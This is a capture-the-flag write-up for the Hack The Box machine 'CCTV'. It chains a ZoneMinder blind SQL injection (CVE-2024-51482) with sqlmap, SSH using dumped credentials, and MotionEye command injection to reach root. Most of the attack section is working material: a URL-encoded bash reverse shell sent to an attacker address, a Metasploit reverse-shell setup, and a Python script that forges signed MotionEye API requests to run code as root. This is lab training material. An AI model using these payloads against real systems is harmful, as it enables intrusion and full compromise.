---
title: "HTB - CCTV"
date: 2026-03-01
tags: ["HackTheBox","Linux","Easy","SQLi","CVE-2024-51482","ZoneMinder","MotionEye","RCE"]
categories: ["Machines&Challenges"]
difficulty: "Easy"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/CCTV.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Easy |
| OS | Linux (Ubuntu 24.04) |
| CVE | CVE-2024-51482 |

---

## Summary

CCTV is an Easy Linux machine running ZoneMinder, a CCTV management web application. The attack chain involves exploiting a boolean-based SQL injection vulnerability (CVE-2024-51482) to enumerate the database and dump credentials, then pivoting through an internal Motion/MotionEye camera stack via command injection in the `picture_filename` parameter to gain a root shell.

---

## Attack Chain Overview

| # | Stage | Technique | CVE/Tool |
|---|-------|-----------|----------|
| 1 | Recon | Nmap + Web fingerprint | - |
| 2 | Foothold | Boolean blind SQLi → creds dump | CVE-2024-51482 |
| 3 | Initial Access | SSH as `mark` (creds from DB) | - |
| 4 | Priv-Esc (Manual) | MotionEye `picture_filename` cmd inject | Internal service |
| 4b | Priv-Esc (MSF) | `motioneye_auth_rce_cve_2025_60787` | CVE-2025-60787 |
| 4c | Priv-Esc (API) | MotionEye `/config/restore` + `/action/lock` | Admin hash |
| 5 | Root | Reverse shell / flag read | - |

---

## 01 - Enumeration

```bash
# Full TCP port scan
nmap -sC -sV -oN cctv.nmap <IP_MACHINE>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.7p1
80/tcp open  http    nginx 1.27 / Apache
```

Port 80 redirects to `http://cctv.htb/zm/?view=console` after adding the hostname to `/etc/hosts`.

```bash
echo '<IP_MACHINE> cctv.htb' | sudo tee -a /etc/hosts
# Application: ZoneMinder v1.37.63
# Default credentials: admin:admin
```

> **Version Note:** ZoneMinder v1.37.63 falls within the vulnerable range (<= 1.37.64) for CVE-2024-51482.

---

## 02 - Foothold: SQL Injection (CVE-2024-51482)

**Vulnerability:** ZoneMinder v1.37.* <= v1.37.64 - boolean-based blind SQL injection in `web/ajax/event.php`. The `tid` parameter in the `removetag` action is passed unsanitised directly into a SQL query.

### Step 1 - Obtain a Session Cookie

```bash
curl -s -c /tmp/zm_cookies.txt -b /tmp/zm_cookies.txt \
  -d 'username=admin&password=admin&action=login&view=login' \
  'http://cctv.htb/zm/index.php'
```

### Step 2 - Exploit with sqlmap

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
  --cookie='ZMSESSID=<your_session>' \
  -D zm -T Users --dump --batch --level=3 --risk=2
```

### Alternative - Custom Python PoC

```bash
git clone https://github.com/BwithE/CVE-2024-51482.git
python3 poc.py <IP_MACHINE>
```

**Credentials Found:**

| Field | Value |
|-------|-------|
| Database | zm |
| Table | Users |
| Username | mark |
| SSH Password | opensesame |

---

## 03 - Initial Access: SSH as mark

```bash
ssh mark@<IP_MACHINE>
# Password: opensesame
```

```
mark@cctv:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
mark@cctv:~$ cat ~/user.txt
```

---

## 04 - Privilege Escalation: Manual Method

### Internal Service Discovery

```bash
mark@cctv:~$ ss -tlnp
# 127.0.0.1:7999  - Motion HTTP control interface
# 127.0.0.1:8765  - MotionEye web UI (runs as root)
# 127.0.0.1:8554  - RTSP stream
```

### Key Insight

The `on_picture_save` hook passes the `picture_filename` value (`%f`) directly to a shell relay script. Because Motion runs as **root**, any shell metacharacters in the filename execute with root privileges.

### Exploitation Steps

```bash
# Step 1 - Start netcat listener
nc -lvnp 4444

# Step 2a - Enable picture output
curl -s 'http://127.0.0.1:7999/1/config/set?picture_output=on'

# Step 2b - Inject reverse shell payload (URL-encoded)
# Decoded: $(bash -c 'bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1')
curl -s 'http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<IP_KALI>%2F4444%200%3E%261%27%29'

# Step 3a - Enable motion emulation
curl -s 'http://127.0.0.1:7999/1/config/set?emulate_motion=on'

# Step 3b - Trigger snapshot
curl -s 'http://127.0.0.1:7999/1/action/snapshot'
```

```
root@cctv:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 04b - Privilege Escalation: Metasploit Module

```bash
# Step 1 - SSH Port Forward
sshpass -p 'opensesame' ssh -o StrictHostKeyChecking=no \
  -N -L 18765:127.0.0.1:8765 mark@<IP_MACHINE>

# Step 2 - Extract Admin Hash
mark@cctv:~$ grep -i 'admin_password' /etc/motioneye/motioneye.conf
# admin_password: 989c5a8ee87a0e9521ec81a79187d162109282f0
```

```bash
# Step 3 - Configure and Run Metasploit
msf6 > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
msf exploit(...) > set RHOSTS 127.0.0.1
msf exploit(...) > set RPORT 18765
msf exploit(...) > set USERNAME admin
msf exploit(...) > set PASSWORD 989c5a8ee87a0e9521ec81a79187d162109282f0
msf exploit(...) > set payload cmd/unix/reverse_bash
msf exploit(...) > set LHOST <IP_KALI>
msf exploit(...) > set LPORT 5555
msf exploit(...) > run
```

> **Note:** The module accepts the raw SHA1 hash in the PASSWORD field - no cracking required.

---

## 04c - Privilege Escalation: MotionEye API Method

MotionEye exposes two powerful primitives when authenticated:
1. `POST /config/restore/` - extracts a tar archive into `/etc/motioneye` as root
2. `POST /action/1/lock/` - executes `/etc/motioneye/lock_1` if it exists

### Step 1 - Create the root action script

```bash
#!/bin/sh
cp /root/root.txt /home/mark/root.txt
chown mark:mark /home/mark/root.txt
chmod 0644 /home/mark/root.txt

chmod 755 lock_1
tar -czf lock_1.tar.gz lock_1
```

### Step 2 - SSH port forward + run exploit

```bash
sshpass -p 'opensesame' ssh -N -L 18765:127.0.0.1:8765 mark@<IP_MACHINE>
python3 exploit_api.py
# [restore] 200 {"ok": true}
# [action]  200 {"ok": true}
```

### Exploit Script

```python
import hashlib, re, urllib.parse, requests

KEY = '989c5a8ee87a0e9521ec81a79187d162109282f0'
BASE = 'http://127.0.0.1:18765'
SIG_RE = re.compile(r'[^a-zA-Z0-9/?_.=&{}[\]:, -]')

def sig(method, path, body, key):
    parts = list(urllib.parse.urlsplit(path))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True)
             if q[0] != '_signature']
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for n,v in query]
    parts[0] = parts[1] = ''
    parts[3] = '&'.join([f'{k}={v}' for k,v in query])
    path = urllib.parse.urlunsplit(parts)
    path = SIG_RE.sub('-', path)
    key = SIG_RE.sub('-', key)
    return hashlib.sha1(f'{method}:{path}::{key}'.encode()).hexdigest().lower()

# 1. Upload tar into /etc/motioneye
path = '/config/restore/?_username=admin'
rsig = sig('POST', path, b'', KEY)
with open('lock_1.tar.gz', 'rb') as f:
    r = requests.post(BASE + path + '&_signature=' + rsig,
                      files={'files': ('lock_1.tar.gz', f, 'application/gzip')}, timeout=20)
    print('[restore]', r.status_code, r.text)

# 2. Execute lock_1 via action handler
path = '/action/1/lock/?_username=admin'
asig = sig('POST', path, b'', KEY)
r = requests.post(BASE + path + '&_signature=' + asig, timeout=20)
print('[action]', r.status_code, r.text)
```

---

## CVEs Referenced

| CVE ID | Component | Type | Description |
|--------|-----------|------|-------------|
| CVE-2024-51482 | ZoneMinder <= 1.37.64 | SQLi | Boolean blind injection in `event.php` tid parameter |
| GHSA-9cmr-7437-v9fj | ZoneMinder | SQLi | Time-based SQL injection (related advisory) |
| CVE-2025-60787 | MotionEye | RCE | Authenticated RCE exploited by Metasploit module |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| sqlmap | Automated SQL injection exploitation |
| curl | HTTP interaction with ZoneMinder and Motion APIs |
| CVE-2024-51482 PoC | `git clone https://github.com/BwithE/CVE-2024-51482.git` |
| sshpass + ssh -L | SSH port forwarding |
| Metasploit (msf6) | `motioneye_auth_rce_cve_2025_60787` |
| netcat (nc) | Reverse shell listener |
| Python requests | MotionEye admin API HMAC-signed requests |
